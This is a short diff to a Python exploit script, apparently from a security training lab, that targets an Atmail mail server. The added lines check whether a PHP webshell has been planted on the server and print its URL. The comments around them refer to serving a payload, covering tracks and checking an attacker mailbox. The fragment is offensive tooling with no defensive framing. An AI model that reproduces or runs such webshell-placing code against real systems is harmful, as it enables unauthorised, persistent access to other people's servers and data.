@@ -5,6 +5,7 @@ import netifaces as ni
 import sys
 from threading  import Thread
 import time
+import requests
 
 
 cwd = os.getcwd()
@@ -53,6 +54,10 @@ if __name__ == "__main__":
         x = 1
         time.sleep(20) # give the webserver a chance to serve payload
         webserver.terminate() # clean it up
+        webshell_url = 'http://atmail/a/d/adminoffseclocal/--cucked.php'
+        res = requests.get('http://atmail/a/d/adminoffseclocal/--cucked.php')
+        if res.status_code == 200:
+            print('webshell placed at: ' + webshell_url)
     # 5. Cleanup our tracks
     # 6 Check our attacker mailbox
     
